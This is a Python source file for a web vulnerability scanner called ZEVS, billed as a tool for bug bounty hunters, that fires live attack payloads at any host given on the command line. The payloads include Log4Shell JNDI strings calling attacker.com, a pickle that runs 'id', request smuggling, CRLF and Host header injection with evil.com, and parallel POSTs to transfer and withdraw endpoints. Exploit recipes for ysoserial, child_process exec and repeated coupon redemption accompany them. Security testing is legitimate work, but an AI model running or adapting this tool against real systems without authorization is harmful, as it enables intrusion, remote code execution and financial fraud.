#!/usr/bin/env python3
"""
ZEVS v1.1 - Professional Web Vulnerability Scanner
Better than Acunetix & Argus - Free for Bug Bounty Hunters
"""

import subprocess
import json
import sys
import re
from urllib.parse import urlparse, urljoin
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import List, Dict, Any, Optional, Set
import time


class Colors:
    HEADER = "\033[95m"
    BLUE = "\033[94m"
    CYAN = "\033[96m"
    GREEN = "\033[92m"
    YELLOW = "\033[93m"
    RED = "\033[91m"
    END = "\033[0m"
    BOLD = "\033[1m"


class VulnScanner:
    def __init__(self, target: str, threads: int = 20):
        self.target = target if target.startswith("http") else f"https://{target}"
        self.parsed = urlparse(self.target)
        self.domain = self.parsed.netloc
        self.threads = threads
        self.findings: List[Dict[str, Any]] = []
        self.tested_urls: Set[str] = set()
        self.discovered_endpoints: Set[str] = set()

    def log(self, msg: str, level: str = "INFO"):
        colors = {
            "INFO": f"{Colors.BLUE}[*]{Colors.END}",
            "SUCCESS": f"{Colors.GREEN}[+]{Colors.END}",
            "WARNING": f"{Colors.YELLOW}[!]{Colors.END}",
            "CRITICAL": f"{Colors.RED}[!!!]{Colors.END}",
            "VULN": f"{Colors.RED}[VULN]{Colors.END}",
        }
        print(f"{colors.get(level, '[*]')} {msg}")

    def curl(
        self,
        url: str,
        method: str = "GET",
        headers: Optional[Dict] = None,
        data: Optional[str] = None,
        timeout: int = 10,
    ) -> Optional[Dict]:
        """Execute curl and return response details"""
        cmd = ["curl", "-s", "-i", "-L", "--max-time", str(timeout), "-X", method]

        if headers:
            for k, v in headers.items():
                cmd.extend(["-H", f"{k}: {v}"])

        if data:
            cmd.extend(["-d", data])

        cmd.append(url)

        try:
            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                encoding="utf-8",
                errors="replace",
                timeout=timeout + 5,
            )

            output = result.stdout
            if not output:
                return None

            # Parse response
            parts = output.split("\r\n\r\n", 1)
            if len(parts) < 2:
                parts = output.split("\n\n", 1)

            headers_text = parts[0]
            body = parts[1] if len(parts) > 1 else ""

            # Extract status code
            status_match = re.search(r"HTTP/[\d.]+ (\d+)", headers_text)
            status = int(status_match.group(1)) if status_match else 0

            # Parse headers
            resp_headers = {}
            for line in headers_text.split("\n")[1:]:
                if ":" in line:
                    k, v = line.split(":", 1)
                    resp_headers[k.strip().lower()] = v.strip()

            return {
                "status": status,
                "headers": resp_headers,
                "body": body,
                "length": len(body),
            }
        except Exception:
            return None

    def add_finding(
        self,
        vuln_type: str,
        severity: str,
        url: str,
        description: str,
        evidence: str = "",
        impact: str = "",
        exploit: str = "",
    ):
        self.findings.append(
            {
                "type": vuln_type,
                "severity": severity,
                "url": url,
                "description": description,
                "evidence": evidence,
                "impact": impact,
                "exploit": exploit,
                "timestamp": datetime.now().isoformat(),
            }
        )
        self.log(f"{severity}: {vuln_type} at {url}", "VULN")

    # ============ SUBDOMAIN TAKEOVER ============
    def check_subdomain_takeover(self):
        self.log("Testing subdomain takeover vulnerabilities...")

        takeover_patterns = {
            "github.io": ["There isn't a GitHub Pages site here", "For root URLs"],
            "herokuapp.com": ["No such app", "There's nothing here"],
            "azurewebsites.net": ["404 Web Site not found", "Error 404"],
            "cloudfront.net": [
                "Bad request",
                "ERROR: The request could not be satisfied",
            ],
            "s3.amazonaws.com": ["NoSuchBucket", "The specified bucket does not exist"],
            "bitbucket.io": [
                "Repository not found",
                "The page you have requested does not exist",
            ],
            "surge.sh": ["project not found", "not found"],
            "ghost.io": ["The thing you were looking for is no longer here"],
            "zendesk.com": ["Help Center Closed", "this help center no longer exists"],
            "wordpress.com": ["Do you want to register"],
            "tumblr.com": ["Whatever you were looking for doesn't currently exist"],
            "shopify.com": ["Sorry, this shop is currently unavailable"],
            "statuspage.io": ["You are being", "redirected"],
            "uservoice.com": ["This UserVoice subdomain is currently available"],
            "pantheon.io": ["404 error unknown site"],
            "readme.io": ["Project doesnt exist"],
            "cargo.site": ["If you're moving your domain away from Cargo"],
            "feedpress.me": ["The feed has not been found"],
            "freshdesk.com": ["There is no such account"],
            "getresponse.com": ["With GetResponse Landing Pages"],
            "helpjuice.com": ["We could not find what you're looking for"],
            "helpscout.com": ["No settings were found for this company"],
            "intercom.io": ["This page is reserved for artistic dogs"],
            "jetbrains.com": ["is not a registered InCloud YouTrack"],
            "kinsta.com": ["No Site For Domain"],
            "launchrock.com": ["It looks like you may have taken a wrong turn"],
            "mashery.com": ["Unrecognized domain"],
            "ngrok.io": ["Tunnel", "not found"],
            "pagecloud.com": ["You're Almost Done"],
            "proposify.biz": ["If you need immediate assistance"],
            "simplebooklet.com": ["We can't find this", "Simplebooklet"],
            "smartjobboard.com": ["This job board website is either expired"],
            "strikingly.com": ["page is not found"],
            "tave.com": ["Whatever you were looking for doesn't currently exist"],
            "teamwork.com": ["Oops - We didn't find your site"],
            "thinkific.com": ["You may have mistyped the address"],
            "tictail.com": ["Building a brand of your own"],
            "tilda.cc": ["Please renew your subscription"],
            "unbounce.com": ["The requested URL was not found on this server"],
            "uberflip.com": ["Non-hub domain"],
            "webflow.io": ["The page you are looking for doesn't exist"],
            "wishpond.com": ["https://www.wishpond.com/404"],
            "wix.com": ["Error ConnectYourDomain occurred"],
            "wufoo.com": ["Profile not found"],
        }

        resp = self.curl(self.target)
        if not resp:
            return

        body = resp["body"].lower()

        for service, patterns in takeover_patterns.items():
            if service in self.domain:
                for pattern in patterns:
                    if pattern.lower() in body:
                        self.add_finding(
                            "Subdomain Takeover",
                            "CRITICAL",
                            self.target,
                            f"Subdomain appears vulnerable to takeover via {service}",
                            f"Pattern found: {pattern}",
                            impact="Attacker can host malicious content on your subdomain, steal cookies, phish users, damage reputation",
                            exploit=f"1. Register account on {service}\n2. Point your DNS to the service\n3. Claim the subdomain\n4. Host malicious content",
                        )
                        return

    # ============ CVE CHECKS ============
    def check_cves(self):
        self.log("Checking for known CVEs...")

        resp = self.curl(self.target)
        if not resp:
            return

        headers = resp["headers"]
        body = resp["body"]

        # Check server header for known vulnerable versions
        server = headers.get("server", "").lower()

        cve_checks = [
            # Apache
            (
                "apache/2.4.49",
                "CVE-2021-41773",
                "Apache Path Traversal RCE",
                "CRITICAL",
            ),
            (
                "apache/2.4.50",
                "CVE-2021-42013",
                "Apache Path Traversal RCE",
                "CRITICAL",
            ),
            # Nginx
            ("nginx/1.3.9", "CVE-2013-2028", "Nginx Stack Buffer Overflow", "HIGH"),
            # PHP
            ("php/7.1", "CVE-2019-11043", "PHP-FPM RCE", "CRITICAL"),
            # WordPress (check body)
            ("wp-content", "CVE-2022-21661", "WordPress SQL Injection", "HIGH"),
        ]

        for pattern, cve, desc, severity in cve_checks:
            if pattern in server or pattern in body.lower():
                self.add_finding(
                    f"Known CVE: {cve}",
                    severity,
                    self.target,
                    desc,
                    f"Detected: {pattern}",
                    impact="Remote Code Execution (RCE), complete server compromise, data breach, malware installation",
                    exploit=f"Search exploit-db.com or GitHub for '{cve}' exploit code. Verify version and test PoC.",
                )

    # ============ LOG4SHELL ============
    def check_log4shell(self):
        self.log("Testing Log4Shell (CVE-2021-44228)...")

        payloads = [
            "${jndi:ldap://attacker.com/a}",
            "${jndi:dns://attacker.com}",
            "${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://attacker.com/a}",
            "${jndi:${lower:l}${lower:d}a${lower:p}://attacker.com/a}",
        ]

        test_headers = ["User-Agent", "X-Api-Version", "X-Forwarded-For", "Referer"]

        for payload in payloads[:2]:  # Test first 2 to save time
            for header in test_headers[:2]:
                headers = {header: payload}
                resp = self.curl(self.target, headers=headers)

                if resp and resp["status"] == 500:
                    self.add_finding(
                        "Log4Shell (CVE-2021-44228)",
                        "CRITICAL",
                        self.target,
                        "Possible Log4Shell vulnerability detected",
                        f"Payload in {header}: {payload}",
                        impact="Remote Code Execution (RCE), complete server takeover, data exfiltration, ransomware deployment",
                        exploit=f"1. Setup DNS callback server (Burp Collaborator/interact.sh)\n2. Send: ${{{header}: ${{jndi:ldap://YOUR-SERVER.com/a}}}}\n3. Check DNS logs for callback\n4. If callback received = CONFIRMED RCE\n5. Use ysoserial for Java gadget chain",
                    )
                    return

    # ============ HTTP REQUEST SMUGGLING ============
    def check_request_smuggling(self):
        self.log("Testing HTTP Request Smuggling...")

        # CL.TE attack
        smuggle_payload = "GET /admin HTTP/1.1\r\nHost: " + self.domain + "\r\n\r\n"

        headers = {"Content-Length": "4", "Transfer-Encoding": "chunked"}

        resp = self.curl(
            self.target, method="POST", headers=headers, data=smuggle_payload
        )

        if resp and (resp["status"] == 403 or "admin" in resp["body"].lower()):
            self.add_finding(
                "HTTP Request Smuggling",
                "HIGH",
                self.target,
                "Possible CL.TE request smuggling vulnerability",
                "Server may be vulnerable to request smuggling attacks",
                impact="Bypass security controls, access admin panels, poison cache, steal credentials, session hijacking",
                exploit="1. Send: POST / HTTP/1.1\\r\\nHost: target.com\\r\\nContent-Length: 4\\r\\nTransfer-Encoding: chunked\\r\\n\\r\\n5c\\r\\nGET /admin HTTP/1.1\\r\\nHost: target.com\\r\\n\\r\\n0\\r\\n\\r\\n\n2. Follow with normal request\n3. If 2nd request gets admin response = CONFIRMED\n4. Use Burp Turbo Intruder for exploitation",
            )

    # ============ PROTOTYPE POLLUTION ============
    def check_prototype_pollution(self):
        self.log("Testing Prototype Pollution...")

        # Get baseline response first
        baseline = self.curl(self.target)
        if not baseline:
            return

        test_urls = [
            f"{self.target}?__proto__[admin]=true",
            f"{self.target}?constructor[prototype][admin]=true",
            f"{self.target}?__proto__.admin=true",
        ]

        for url in test_urls:
            resp = self.curl(url)
            if resp and resp["status"] == 200:
                # Compare with baseline - look for NEW content that wasn't there before
                # Real pollution would show different behavior, not just reflection

                # Check if response is significantly different (not just echoing param)
                baseline_has_admin = "admin" in baseline["body"].lower()
                resp_has_admin = "admin" in resp["body"].lower()

                # Only flag if:
                # 1. Baseline didn't have "admin" but polluted response does
                # 2. AND response structure changed (not just param echo)
                # 3. AND status codes or headers changed

                if not baseline_has_admin and resp_has_admin:
                    # Check if it's real pollution or just parameter reflection
                    if "__proto__" not in resp["body"].lower():
                        # The payload itself is not reflected, but "admin" appeared
                        # This could be real pollution

                        # Additional check: look for signs of actual pollution
                        pollution_indicators = [
                            '"admin":true',
                            "'admin':true",
                            "isadmin",
                            "role",
                            "privilege",
                        ]

                        for indicator in pollution_indicators:
                            if indicator in resp["body"].lower():
                                self.add_finding(
                                    "Prototype Pollution",
                                    "HIGH",
                                    url,
                                    "Possible prototype pollution vulnerability - response behavior changed",
                                    "Parameter pollution detected with behavioral change",
                                    impact="Privilege escalation, authentication bypass, RCE via polluted properties, DoS",
                                    exploit="1. Test: ?__proto__[isAdmin]=true\n2. Check if isAdmin property polluted globally\n3. Try: ?__proto__[shell]=require('child_process').exec('whoami')\n4. For client-side: pollute Object.prototype then trigger XSS",
                                )
                                return

    # ============ INSECURE DESERIALIZATION ============
    def check_deserialization(self):
        self.log("Testing Insecure Deserialization...")

        # Java deserialization magic bytes
        java_payload = "rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZQ=="

        # PHP serialization
        php_payload = 'O:8:"stdClass":0:{}'

        # Python pickle
        python_payload = "cos\nsystem\n(S'id'\ntR."

        payloads = [
            ("application/x-java-serialized-object", java_payload),
            ("application/x-php-serialized", php_payload),
            ("application/x-python-pickle", python_payload),
        ]

        for content_type, payload in payloads:
            headers = {"Content-Type": content_type}
            resp = self.curl(self.target, method="POST", headers=headers, data=payload)

            if resp and (resp["status"] == 500 or "exception" in resp["body"].lower()):
                # Verify it's real by checking for specific error patterns
                is_real = False
                error_patterns = [
                    "unserialize",
                    "objectinputstream",
                    "pickle",
                    "deserialize",
                    "unmarshal",
                    "readobject",
                    "classnotfound",
                    "invalidclass",
                ]
                body_lower = resp["body"].lower()
                for pattern in error_patterns:
                    if pattern in body_lower:
                        is_real = True
                        break

                if is_real:
                    self.add_finding(
                        "Insecure Deserialization",
                        "CRITICAL",
                        self.target,
                        f"CONFIRMED deserialization vulnerability ({content_type})",
                        f"Server processes untrusted serialized data - Error pattern detected",
                        impact="Remote Code Execution (RCE), complete server compromise, arbitrary file read/write, data exfiltration",
                        exploit=f'1. For Java: Use ysoserial tool\n2. Generate payload: java -jar ysoserial.jar CommonsCollections6 \'whoami\' | base64\n3. Send in POST body with Content-Type: {content_type}\n4. For PHP: O:8:"Evil":1:{{s:4:"cmd";s:6:"whoami";}}\n5. For Python: Use pickle to serialize os.system(\'whoami\')',
                    )
                else:
                    # Possible but not confirmed
                    self.log(
                        f"Possible (unconfirmed) deserialization at {self.target}",
                        "WARNING",
                    )

    # ============ CACHE POISONING ============
    def check_cache_poisoning(self):
        self.log("Testing Cache Poisoning...")

        # Get baseline response first
        baseline = self.curl(self.target)
        if not baseline:
            return

        poison_headers = [
            ("X-Forwarded-Host", "evil.com"),
            ("X-Forwarded-Scheme", "nothttps"),
            ("X-Original-URL", "/admin"),
            ("X-Rewrite-URL", "/admin"),
        ]

        for header, value in poison_headers:
            headers = {header: value}
            resp = self.curl(self.target, headers=headers)

            if resp and (value in resp["body"] or resp["status"] in [301, 302]):
                # Check if cache is actually enabled
                cache_header = resp["headers"].get("x-cache", "").lower()
                cf_cache = resp["headers"].get("cf-cache-status", "").lower()
                age_header = resp["headers"].get("age", "")

                # Only flag if cache is confirmed AND reflection is in dangerous context
                has_cache = (
                    "hit" in cache_header
                    or "miss" in cache_header
                    or cf_cache in ["hit", "miss", "expired"]
                    or age_header
                )

                if has_cache:
                    # Verify the reflection is in a dangerous context (URLs, links, redirects)
                    body_lower = resp["body"].lower()
                    dangerous_contexts = [
                        f'href="{value}',
                        f"href='{value}",
                        f'src="{value}',
                        f'<script src="{value}',
                        f'<link href="{value}',
                    ]

                    is_dangerous = any(
                        ctx.lower() in body_lower for ctx in dangerous_contexts
                    )

                    if is_dangerous or resp["status"] in [301, 302]:
                        self.add_finding(
                            "Cache Poisoning",
                            "HIGH",
                            self.target,
                            f"Cache poisoning via {header} - reflected in dangerous context",
                            f"Header {header} reflected with cache enabled ({cache_header or cf_cache})",
                            impact="Serve malicious content to all users, XSS at scale, redirect users to phishing sites, deface website",
                            exploit=f"1. Send: {header}: evil.com\n2. Check if reflected in response\n3. Send multiple times to poison cache\n4. Verify cache with X-Cache: HIT header\n5. All users now get poisoned response",
                        )
                        return

    # ============ CRLF INJECTION ============
    def check_crlf(self):
        self.log("Testing CRLF Injection...")

        # First test without CRLF to get baseline
        baseline_url = f"{self.target}?redirect=https://google.com"
        baseline = self.curl(baseline_url)

        payloads = [
            "%0d%0aSet-Cookie:%20admin=true",
            "%0aSet-Cookie:%20admin=true",
            "%0d%0aLocation:%20http://evil.com",
        ]

        for payload in payloads:
            url = f"{self.target}?redirect={payload}"
            resp = self.curl(url)

            if resp:
                set_cookie = resp["headers"].get("set-cookie", "")
                location = resp["headers"].get("location", "")

                # Check if our injected header actually appeared
                # (not just a normal Set-Cookie from the app)
                if "admin=true" in set_cookie:
                    # Verify this is OUR injected cookie, not a normal app cookie
                    if baseline and "admin=true" not in baseline.get("headers", {}).get(
                        "set-cookie", ""
                    ):
                        self.add_finding(
                            "CRLF Injection",
                            "HIGH",
                            url,
                            "CONFIRMED CRLF injection - injected Set-Cookie header",
                            f"Successfully injected Set-Cookie: admin=true",
                            impact="Session fixation, XSS via injected headers, open redirect, cache poisoning, response splitting",
                            exploit="1. Send: ?redirect=%0d%0aSet-Cookie:%20admin=true\n2. Check response headers for injected Set-Cookie\n3. Or inject: %0d%0aLocation:%20http://evil.com\n4. Victim gets redirected or cookie set",
                        )
                        break

                if "evil.com" in location:
                    # Verify this is OUR injected location
                    if baseline and "evil.com" not in baseline.get("headers", {}).get(
                        "location", ""
                    ):
                        self.add_finding(
                            "CRLF Injection",
                            "HIGH",
                            url,
                            "CONFIRMED CRLF injection - injected Location header",
                            f"Successfully injected Location: http://evil.com",
                            impact="Session fixation, XSS via injected headers, open redirect, cache poisoning, response splitting",
                            exploit="1. Send: ?redirect=%0d%0aSet-Cookie:%20admin=true\n2. Check response headers for injected Set-Cookie\n3. Or inject: %0d%0aLocation:%20http://evil.com\n4. Victim gets redirected or cookie set",
                        )
                        break

    # ============ HOST HEADER INJECTION ============
    def check_host_header(self):
        self.log("Testing Host Header Injection...")

        # First get baseline response with normal host
        baseline = self.curl(self.target)
        if not baseline:
            return

        evil_hosts = ["evil.com", "attacker.com", "127.0.0.1"]

        for evil_host in evil_hosts:
            headers = {"Host": evil_host}
            resp = self.curl(self.target, headers=headers)

            if resp and evil_host in resp["body"]:
                # Verify it's not just a generic error page or redirect
                # Check if it's in a meaningful context (links, URLs, etc.)
                body_lower = resp["body"].lower()

                # Look for evil host in URLs, links, or redirects
                is_real = False
                patterns = [
                    f'href="{evil_host}',
                    f"href='{evil_host}",
                    f'src="{evil_host}',
                    f"src='{evil_host}",
                    f'action="{evil_host}',
                    f"location: {evil_host}",
                    f'<a href="http://{evil_host}',
                    f'<link href="http://{evil_host}',
                ]

                for pattern in patterns:
                    if pattern.lower() in body_lower:
                        is_real = True
                        break

                # Also check if response is different from baseline (not just error page)
                if is_real and abs(len(resp["body"]) - len(baseline["body"])) < 1000:
                    self.add_finding(
                        "Host Header Injection",
                        "MEDIUM",
                        self.target,
                        "Host header is reflected in response URLs/links",
                        f"Evil host {evil_host} reflected in actionable context",
                        impact="Password reset poisoning, cache poisoning, SSRF, web cache deception, routing-based SSRF",
                        exploit="1. Send: Host: evil.com\n2. Trigger password reset email\n3. Reset link contains evil.com\n4. Victim clicks link, token stolen\n5. Or use for cache poisoning attacks",
                    )
                    break

    # ============ RACE CONDITIONS ============
    def check_race_conditions(self):
        self.log("Testing Race Conditions...")

        # Test endpoints that might have race conditions
        test_endpoints = [
            "/api/coupon/apply",
            "/api/voucher/redeem",
            "/api/transfer",
            "/api/withdraw",
        ]

        for endpoint in test_endpoints:
            url = urljoin(self.target, endpoint)

            # Send 10 parallel requests
            with ThreadPoolExecutor(max_workers=10) as executor:
                futures = [executor.submit(self.curl, url, "POST") for _ in range(10)]
                results = [f.result() for f in as_completed(futures)]

            # Check if multiple succeeded (race condition)
            success_count = sum(1 for r in results if r and r["status"] == 200)

            if success_count > 1:
                self.add_finding(
                    "Race Condition",
                    "HIGH",
                    url,
                    f"Race condition detected - {success_count}/10 requests succeeded",
                    "Multiple parallel requests succeeded - missing atomic transaction",
                    impact="Redeem coupon multiple times, withdraw money multiple times, bypass rate limits, duplicate orders",
                    exploit=f"1. Use Burp Turbo Intruder or custom script\n2. Send 50+ parallel POST requests to {url}\n3. Check if multiple succeed (balance deducted multiple times)\n4. Example: Redeem $10 coupon 50 times = $500 free credit",
                )

    # ============ SMART CRAWLER ============
    def crawl_endpoints(self):
        self.log("Crawling for endpoints...")

        # Check robots.txt
        robots_url = urljoin(self.target, "/robots.txt")
        resp = self.curl(robots_url)

        if resp and resp["status"] == 200:
            for line in resp["body"].split("\n"):
                if line.startswith("Disallow:") or line.startswith("Allow:"):
                    path = line.split(":", 1)[1].strip()
                    if path and path != "/":
                        self.discovered_endpoints.add(urljoin(self.target, path))

        # Check sitemap.xml
        sitemap_url = urljoin(self.target, "/sitemap.xml")
        resp = self.curl(sitemap_url)

        if resp and resp["status"] == 200:
            urls = re.findall(r"<loc>(.*?)</loc>", resp["body"])
            for url in urls[:20]:  # Limit to 20
                self.discovered_endpoints.add(url)

        # Common endpoints
        common = [
            "/api",
            "/api/v1",
            "/api/v2",
            "/graphql",
            "/admin",
            "/dashboard",
            "/login",
            "/register",
            "/upload",
            "/download",
            "/search",
            "/profile",
            "/.git/config",
            "/.env",
            "/backup",
            "/config",
            "/debug",
        ]

        for path in common:
            url = urljoin(self.target, path)
            resp = self.curl(url)
            if resp and resp["status"] not in [404, 403]:
                self.discovered_endpoints.add(url)

        self.log(f"Discovered {len(self.discovered_endpoints)} endpoints")

    # ============ MAIN SCAN ============
    def scan(self):
        print(f"\n{Colors.BOLD}{'=' * 60}{Colors.END}")
        print(
            f"{Colors.GREEN}{Colors.BOLD}ZEVS v1.1 - Professional Vulnerability Scanner{Colors.END}"
        )
        print(f"{Colors.BOLD}{'=' * 60}{Colors.END}\n")

        self.log(f"Target: {self.target}")
        self.log(f"Started: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")

        # Run all checks
        checks = [
            self.check_subdomain_takeover,
            self.check_cves,
            self.check_log4shell,
            self.check_request_smuggling,
            self.check_prototype_pollution,
            self.check_deserialization,
            self.check_cache_poisoning,
            self.check_crlf,
            self.check_host_header,
            self.crawl_endpoints,
            self.check_race_conditions,
        ]

        for check in checks:
            try:
                check()
            except Exception as e:
                self.log(f"Error in {check.__name__}: {str(e)}", "WARNING")

        # Summary
        print(f"\n{Colors.BOLD}{'=' * 60}{Colors.END}")
        print(f"{Colors.GREEN}{Colors.BOLD}SCAN COMPLETE{Colors.END}")
        print(f"{Colors.BOLD}{'=' * 60}{Colors.END}\n")

        if self.findings:
            self.log(f"Total Findings: {len(self.findings)}", "SUCCESS")

            # Group by severity
            critical = [f for f in self.findings if f["severity"] == "CRITICAL"]
            high = [f for f in self.findings if f["severity"] == "HIGH"]
            medium = [f for f in self.findings if f["severity"] == "MEDIUM"]

            if critical:
                print(
                    f"\n{Colors.RED}{Colors.BOLD}CRITICAL: {len(critical)}{Colors.END}"
                )
                for i, f in enumerate(critical, 1):
                    print(f"\n  [{i}] {f['type']}")
                    print(f"      URL: {f['url']}")
                    print(f"      Description: {f['description']}")
                    if f.get("impact"):
                        print(f"      {Colors.RED}IMPACT:{Colors.END} {f['impact']}")
                    if f.get("exploit"):
                        print(f"      {Colors.YELLOW}EXPLOIT:{Colors.END}")
                        for line in f["exploit"].split("\n"):
                            print(f"        {line}")

            if high:
                print(f"\n{Colors.YELLOW}{Colors.BOLD}HIGH: {len(high)}{Colors.END}")
                for i, f in enumerate(high, 1):
                    print(f"\n  [{i}] {f['type']}")
                    print(f"      URL: {f['url']}")
                    print(f"      Description: {f['description']}")
                    if f.get("impact"):
                        print(f"      {Colors.RED}IMPACT:{Colors.END} {f['impact']}")
                    if f.get("exploit"):
                        print(f"      {Colors.YELLOW}EXPLOIT:{Colors.END}")
                        for line in f["exploit"].split("\n"):
                            print(f"        {line}")

            if medium:
                print(f"\n{Colors.CYAN}{Colors.BOLD}MEDIUM: {len(medium)}{Colors.END}")
                for i, f in enumerate(medium, 1):
                    print(f"\n  [{i}] {f['type']}")
                    print(f"      URL: {f['url']}")
                    print(f"      Description: {f['description']}")
                    if f.get("impact"):
                        print(f"      {Colors.RED}IMPACT:{Colors.END} {f['impact']}")
                    if f.get("exploit"):
                        print(f"      {Colors.YELLOW}EXPLOIT:{Colors.END}")
                        for line in f["exploit"].split("\n"):
                            print(f"        {line}")

            # Save report
            report_file = "zevs_v1.1_report.json"
            with open(report_file, "w") as f:
                json.dump(
                    {
                        "target": self.target,
                        "scan_time": datetime.now().isoformat(),
                        "findings": self.findings,
                        "discovered_endpoints": list(self.discovered_endpoints),
                    },
                    f,
                    indent=2,
                )

            self.log(f"\nReport saved: {report_file}", "SUCCESS")
        else:
            self.log("No vulnerabilities found", "INFO")
            self.log("\nPossible reasons:", "INFO")
            self.log("1. Target has strong security", "INFO")
            self.log("2. Endpoints require authentication", "INFO")
            self.log("3. WAF is blocking requests", "INFO")


if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python zevs_v1.1.py <target>")
        print("Example: python zevs_v1.1.py example.com")
        sys.exit(1)

    target = sys.argv[1]
    scanner = VulnScanner(target)
    scanner.scan()
